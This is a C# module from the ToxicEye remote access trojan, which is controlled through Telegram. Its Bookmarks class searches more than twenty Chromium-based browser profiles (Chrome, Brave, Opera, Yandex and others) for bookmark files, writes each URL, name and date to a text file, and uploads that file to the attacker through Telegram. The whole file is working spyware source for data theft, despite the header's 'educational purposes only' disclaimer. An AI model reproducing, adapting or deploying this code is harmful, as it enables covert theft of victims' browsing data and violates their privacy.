/* 
       ^ Author    : LimerBoy
       ^ Name      : ToxicEye-RAT
       ^ Github    : https://github.com/LimerBoy

       > This program is distributed for educational purposes only.
*/

using System;
using System.IO;

namespace TelegramRAT
{
    internal class Bookmarks
    {
        public static void get()
        {
            // Path info
            string a_a = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
            string l_a = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
            string u_s = "\\User Data\\Default\\Bookmarks";
            // Browsers list
            string[] chromiumBasedBrowsers = new string[]
            {
                l_a + "Google\\Chrome" + u_s,
                l_a + "Google(x86)\\Chrome" + u_s,
                l_a + "Chromium" + u_s,
                a_a + "Opera Software\\Opera Stable\\Bookmarks",
                l_a + "BraveSoftware\\Brave-Browser" + u_s,
                l_a + "Epic Privacy Browser" + u_s,
                l_a + "Amigo" + u_s,
                l_a + "Vivaldi" + u_s,
                l_a + "Orbitum" + u_s,
                l_a + "Mail.Ru\\Atom" + u_s,
                l_a + "Kometa" + u_s,
                l_a + "Comodo\\Dragon" + u_s,
                l_a + "Torch" + u_s,
                l_a + "Comodo" + u_s,
                l_a + "Slimjet" + u_s,
                l_a + "360Browser\\Browser" + u_s,
                l_a + "Maxthon3" + u_s,
                l_a + "K-Melon" + u_s,
                l_a + "Sputnik\\Sputnik" + u_s,
                l_a + "Nichrome" + u_s,
                l_a + "CocCoc\\Browser" + u_s,
                l_a + "uCozMedia\\Uran" + u_s,
                l_a + "Chromodo" + u_s,
                l_a + "Yandex\\YandexBrowser" + u_s
            };

            // Data
            string filename = "bookmarks.txt";
            string output = "[BOOKMARKS]\n\n";

            // Search all browsers
            foreach (string browser in chromiumBasedBrowsers)
            {
                if (!File.Exists(browser)) { 
                    continue;
                }


                string bookmarksFile = File.ReadAllText(browser);
                foreach (SimpleJSON.JSONNode mark in SimpleJSON.JSON.Parse(bookmarksFile)["roots"]["bookmark_bar"]["children"])
                {
                    output += "URL: " + mark["url"] + "\n"
                           + "NAME: " + mark["name"] + "\n"
                           + "DATE: " + Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10 * Convert.ToInt64((string)mark["date_added"])), TimeZoneInfo.Local)) + "\n"
                           + "\n";
                }
                continue;
            }
            // Send
            File.WriteAllText(filename, output);
            telegram.UploadFile(filename, true);
        }
    }
}
